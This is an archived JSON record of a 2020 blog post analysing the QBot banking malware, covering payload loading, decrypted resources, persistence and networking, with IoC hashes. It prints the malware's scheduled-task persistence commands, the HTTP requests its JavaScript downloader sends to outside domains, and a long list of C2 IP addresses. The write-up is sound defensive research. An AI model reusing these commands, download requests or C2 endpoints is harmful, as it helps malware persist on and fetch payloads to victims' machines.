{
    "id": "162e49cf-c5b6-4da6-86e2-4c702f5c928d",
    "created_at": "2023-01-12T15:01:12.848779Z",
    "updated_at": "2025-03-27T02:05:28.061052Z",
    "deleted_at": null,
    "sha1_hash": "7db9d29bcb14ac3f622b61adda47e61b08d19c79",
    "title": "2020-05-05 - An old enemy – Diving into QBot part 3",
    "authors": "",
    "file_creation_date": "2022-05-28T04:00:54Z",
    "file_modification_date": "2022-05-28T04:00:54Z",
    "file_size": 1078591,
    "plain_text": "# An old enemy – Diving into QBot part 3\n\n**[malwareandstuff.com/an-old-enemy-diving-into-qbot-part-3/](https://malwareandstuff.com/an-old-enemy-diving-into-qbot-part-3/)**\n\n[Published by hackingump on May 5, 2020](https://malwareandstuff.com/author/klopsch/)\n\nHello everyone :-).\n\n\nMay 5, 2020\n\n\nI am continuing my analysis on QBot with this article. If you didn’t read my previous posts,\n[I’ve already covered the packer[1] as well as various QBot’s anti analysis measurements and](https://malwareandstuff.com/an-old-enemy-diving-into-qbot-part-1/)\n[process injection[2].](https://malwareandstuff.com/an-old-enemy-diving-into-qbot-part-2/)\n\nIn this blog post I will explain how the jump to the actual payload is performed. I will also\ncover its resources, decrypt them and take a quick look at the C2 servers which are used by\nthis QBot sample. Finally I will finish off by talking about how QBot achieves persistence and\nmy current progress reversing its networking capabilities.\n\n## Jumping to the DLL entry point\n\n\n-----\n\nOverview of how the entry point is reached\nAs I’ve already explained in my previous posts, QBot is packed by default and after\nunpacking itself, it injects into explorer.exe via `NtWriteVirtualMemory . The injected`\nprocess writes the actual payload in form of a DLL into newly allocated memory.\n\nLet’s take a look at the injected code first. It is a PE Executable and contains multiple\nresources. The resource with the identifier `307 is the Dynamic Linked Library in encrypted`\nform.\n\nResources in the mentioned PE\n\n\n-----\n\nThe mentioned resource is loaded into memory, decrypted and written onto the heap. Again\na new memory area is allocated with `VirtualAlloc and filled with the DLL. Finally it jumps`\nto the entry point of the Dynamic Linked Library and the actual payload is running,\nmasqueraded as `explorer.exe .`\n\n## Dissecting the DLL\n\nAfter dumping the decrypted DLL, I took a deeper look at it. We are not finished with\nresources here.\n\nThe Dynamic Linked Library contains more and all three of them can be decrypted again. I\ndid not look at the arithmetic details of this decryption routine, but I identified the used\nfunction.\n\nRoutine used for decrypting resources\n\n\n-----\n\nThis makes our analysis way easier, since we can just save a virtual machine state, patch\nthe stack parameter used by `FindResourceA to get a handle to one of them resources and`\nunpack them one after another.\n\nPatching the resource to search for\nHere is a sum up of all three resources:\n\n**307 QBot config**\n```\nIn [7]: hexdump.hexdump(data[0x7fa70-0x50:0x7fa70+0x100])\n00000000: B7 13 2A 58 DE 5F DA D2 AD 21 73 AC 71 15 37 BB ..*X._...!s.q.7.\n00000010: 89 E3 88 E4 9D B2 74 CF F9 DB A3 25 31 39 C8 D1 ......t....%19..\n00000020: 30 E3 C4 03 5C EC A9 AE 20 4E 71 C6 B9 5E E2 13 0...\\... Nq..^..\n00000030: 00 00 01 02 92 5B 00 0F D5 75 BE 23 9B 5B 00 08 .....[...u.#.[..\n00000040: 31 30 3D 73 70 78 38 35 0D 0A 33 3D 31 35 38 35 10=spx85..3=1585\n00000050: 32 31 31 33 30 34 0D 0A 70 78 38 35 0D 0A 33 3D 211304..px85..3=\n00000060: 31 35 38 35 32 31 31 33 30 34 0D 0A 00 00 00 00 1585211304......\n00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n\n```\nQBot is delivered with an embedded configuration. They were already covered by multiple\n[other reports, for example one published by Vitali Kremez[3]. It is suspected that the](https://www.vkremez.com/2018/07/lets-learn-in-depth-reversing-of-qakbot.html)\nparameter `10 holds the botnet’s name, which would be` `spx85 here. The parameter` `3`\nmight hold the config time in `UNIX . I did not confirm any of those assumptions though.`\n\n**310 JavaScript payload**\n\nThe resource with `310 identifier holds a JavaScript file which is dropped on demand. I`\npatched the binary in such way so that it is decrypted on purpose.\n\nIt tries to masquerade itself as a WPL file in the user’s folder.\n\n\n-----\n\nFurthermore the following command is executed by the script in order to persist it:\n```\n\"C:\\Windows\\system32\\schtasks.exe\" /create /tn {A08689C8-7EC5-4C51-9737-AFCDFCA848CC}\n/tr \"cmd.exe /C \\\"start /MIN C:\\ Windows\\system32\\cscript.exe //E:javascript\n\\\"C:\\Users\\blackbeard\\csipij.wpl\\\"\\\" sudhfdus\" /sc WEEKLY /D TUE,WED /ST 12:00:00 /F\n\n```\nAV vendors classify this sample as a downloader and I verified this. The file tries to download\ndifferent `BATCH files from different domains and schedules them via` `schtasks.exe .`\n\n\n-----\n\nschtasks.exe is used to run the mentioned files\n```\n# HTTP requests sent to download the mentioned files\nGET /datacollectionservice.php3 HTTP/1.1\nConnection: Keep-Alive\nAccept: */*\nAccept-Language: en-us\nUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\nHost: north.drwongandassociates.com\nGET /datacollectionservice.php3 HTTP/1.1\nConnection: Keep-Alive\nAccept: */*\nAccept-Language: en-us\nUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\nHost: inmotion.heatherling.com\nGET /datacollectionservice.php3 HTTP/1.1\nConnection: Keep-Alive\nAccept: */*\nAccept-Language: en-us\nUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\nHost: qth.w3wvg.com\n\n```\n**311 C2 Servers**\n\nThe final resource contains an insane amount of IP addresses. I am confident that the last\nnumber is the destination port of the corresponding IP.\n\n\n-----\n\n```\n174.82.131.155;0;995\n173.172.205.216;0;443\n71.233.73.222;0;995\n208.126.142.17;0;443\n68.14.210.246;0;22\n96.57.237.162;0;443\n74.138.18.247;0;443\n47.40.244.237;0;443\n71.213.61.215;0;995\n216.201.162.158;0;443\n72.38.44.119;0;995\n47.41.3.57;0;443\n67.250.184.157;0;443\n47.153.115.154;0;443\n173.79.220.156;0;443\n108.27.217.44;0;443\n75.81.25.223;0;995\n67.209.195.198;0;3389\n65.30.12.240;0;443\n66.222.88.126;0;995\n184.191.62.24;0;995\n79.113.157.79;0;443\n80.14.209.42;0;2222\n73.163.242.114;0;443\n108.185.113.12;0;443\n24.99.180.247;0;443\n75.105.224.113;0;993\n216.8.170.82;0;2222\n173.184.96.161;0;443\n173.175.29.210;0;443\n58.177.238.186;0;443\n87.201.206.22;0;443\n89.137.211.38;0;443\n31.5.172.53;0;443\n68.187.28.217;0;2222\n156.96.45.215;0;443\n89.136.105.188;0;443\n74.102.83.89;0;443\n23.24.115.181;0;443\n72.90.243.117;0;0\n188.27.16.17;0;443\n65.96.36.157;0;443\n121.123.79.63;0;443\n173.3.244.208;0;443\n86.124.109.100;0;443\n78.97.116.41;0;443\n173.22.120.11;0;2222\n24.202.42.48;0;2222\n108.54.103.234;0;443\n24.121.254.171;0;443\n47.205.150.29;0;443\n104.220.197.187;0;443\n5.15.73.173;0;443\n83.25.14.84;0;2222\n47.202.98.230;0;443\n\n```\n\n-----\n\n```\n24.46.40.189;0;2222\n72.190.124.29;0;443\n72.16.212.107;0;465\n173.3.132.17;0;995\n70.166.158.118;0;443\n24.229.245.124;0;995\n71.187.170.235;0;443\n49.191.6.183;0;995\n97.78.107.14;0;443\n174.52.64.212;0;443\n188.26.131.41;0;443\n104.34.122.18;0;443\n70.126.76.75;0;443\n24.184.5.251;0;2222\n201.152.111.104;0;995\n68.6.145.21;0;443\n197.207.170.78;0;443\n50.244.112.10;0;443\n72.142.106.198;0;465\n173.173.68.41;0;443\n24.110.14.40;0;443\n100.4.185.8;0;443\n72.36.59.46;0;2222\n41.97.3.25;0;443\n5.2.149.216;0;443\n81.103.144.77;0;443\n74.33.70.220;0;443\n71.77.231.251;0;443\n100.1.239.189;0;443\n206.169.163.147;0;995\n96.41.93.96;0;443\n98.190.24.81;0;443\n5.237.57.127;0;2222\n67.7.2.109;0;2222\n75.110.250.89;0;443\n68.204.164.222;0;443\n5.14.118.122;0;443\n24.55.152.50;0;995\n5.12.213.152;0;2222\n94.53.92.42;0;443\n70.57.15.187;0;993\n100.38.123.22;0;443\n78.96.177.188;0;443\n46.153.111.112;0;995\n73.226.220.56;0;443\n104.152.16.45;0;995\n70.62.160.186;0;6883\n216.104.200.187;0;443\n72.188.81.12;0;443\n188.27.17.115;0;443\n93.114.246.195;0;443\n73.142.81.221;0;443\n12.5.37.3;0;443\n73.169.47.57;0;443\n24.201.79.208;0;2078\n\n```\n\n-----\n\n```\n64.121.69.241;0;443\n184.176.139.8;0;443\n98.219.77.197;0;443\n50.29.166.232;0;995\n24.168.237.215;0;443\n206.255.163.120;0;443\n24.110.96.149;0;443\n100.40.48.96;0;443\n24.61.47.73;0;443\n68.174.15.223;0;443\n63.155.135.211;0;995\n75.82.228.209;0;443\n74.222.204.82;0;443\n77.81.20.66;0;2222\n47.153.115.154;0;993\n69.246.151.5;0;443\n71.77.252.14;0;2222\n24.37.178.158;0;443\n209.213.30.152;0;443\n86.123.95.59;0;2222\n72.29.181.77;0;2078\n64.19.74.29;0;995\n76.23.204.29;0;443\n68.49.120.179;0;443\n50.244.112.106;0;443\n98.213.28.175;0;443\n74.96.151.6;0;443\n47.180.66.10;0;443\n98.164.253.75;0;443\n188.24.255.148;0;443\n72.209.191.27;0;443\n36.77.151.211;0;443\n184.180.157.203;0;2222\n67.61.192.14;0;443\n71.12.214.209;0;2222\n70.120.149.173;0;443\n66.69.202.75;0;2222\n89.137.162.193;0;443\n174.126.224.51;0;443\n68.225.250.136;0;443\n225.250.136;0;443\n\n```\nI’ve continued to investigate them and mapped them to their locations. It seems that most of\nthem are located in the USA:\n\n**Country** **Number ip addresses**\n\nUSA 106\n\nRomania 20\n\nCanada 6\n\n\n-----\n\nAlgeria 2\n\nIndonesia 1\n\nUganda 1\n\nSaudi Arabia 1\n\nIran 1\n\nUnited Kingdom 1\n\nMexico 1\n\nAustralia 1\n\nHong Kong 1\n\nFrance 1\n\nUnited Arab Emirates 1\n\nMaltego graph with entered IP addresses\n\n## Persistence\n\n\n-----\n\nJust as a quick reminder, the DLL file is the payload that is written memory, the PE\nExecutable is the file that decrypts this Dynamic Linked Library.\n\nThe DLL persists the PE Executable via task scheduling:\n```\n\"C:\\Windows\\system32\\schtasks.exe\" /create /tn {16753DD8-A521-4218-A67B-D26BE4D2866C}\n/tr \"\\\"C:\\Users\\blackbeard\\AppData\\Roaming\\Microsoft\\Wgciqj\\csipij.exe\\\"\" /sc HOURLY\n/mo 5 /F \n\n```\nQBot can be executed with different parameters and before the process above was created,\nthe PE Executable is run with parameter `/W :`\n```\n\"C:\\Users\\blackbeard\\AppData\\Roaming\\Microsoft\\Wgciqj\\csipij.exe\" /W\n\n```\nThis seemed a bit irritating, as I identified this parameter to be used for debugging/testing\n[purposes. An analysis report at hatching.io[4] came to the same conclusion. I did not verify it,](https://hatching.io/blog/reversing-qakbot/)\nbut this process might be created before to test wether the upcoming steps will be executed\nproperly. This is just a thesis though and I did not confirm it.\n\n## Networking\n\nBefore I am finishing my blog article here, I wanted to talk about what I’ve discovered about\nthe sample’s networking capabilities.\n\nIndependent from the c2 adresses that are embedded into resources, QBot also has IP\naddresses which are hardcoded into the file. So far I’ve identified one of them, the\n[decryption algorithm is the same, I’ve already mentioned in my previous blog post[5].](https://malwareandstuff.com/diving-into-qbot-part-1-5-cracking-string-encryption/)\nIt tries to fetch the victim’s IP address by sending a HTTP to `ip-adress.com and`\nparse the response. Probably sending the victim’s address to the c2 server.\nOne C2 server with the IP adress `23.49.13.33 is contacted on port 7000.`\n\n## Conclusion\n\nEach time I start analysing and write about QBot, I am telling myself:\n\n“This will be my last blog post about QBot, I will finish my analysis here”\n\nWell I’ve told myself this already 2 times, so I will stop doing that ;-). There is still way more\nto discover and to learn.\nIf I’ve made any mistakes in my analysis, feel free to tell me! I wanted to take a look at the\nnetworking capabilities next time.\n\nStay healthy!\n\n## IoCs\n\nPacked QBot :\n\n```\n8d4a8cca5bb7f155349143add6324252d6572122a119c47c2bb68212dc524fda\n\n```\n\n-----\n\nUnpackedDLL :\n```\n60d6a908515ce29d568bc9d2df91ed6f121e89736fc6cf1fd3840c6ffca0fa3f\n\n```\nExtracted JS :\n\n```\nbf04e191be67b11a69b87d93252ababe4a186a7bc746d110c897bd355d190ffa\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-05 - An old enemy – Diving into QBot part 3.pdf"
    ],
    "report_names": [
        "2020-05-05 - An old enemy – Diving into QBot part 3.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535672,
    "ts_updated_at": 1743041128,
    "ts_creation_date": 1653710454,
    "ts_modification_date": 1653710454,
    "files": {
        "pdf": "https://archive.orkl.eu/7db9d29bcb14ac3f622b61adda47e61b08d19c79.pdf",
        "text": "https://archive.orkl.eu/7db9d29bcb14ac3f622b61adda47e61b08d19c79.txt",
        "img": "https://archive.orkl.eu/7db9d29bcb14ac3f622b61adda47e61b08d19c79.jpg"
    }
}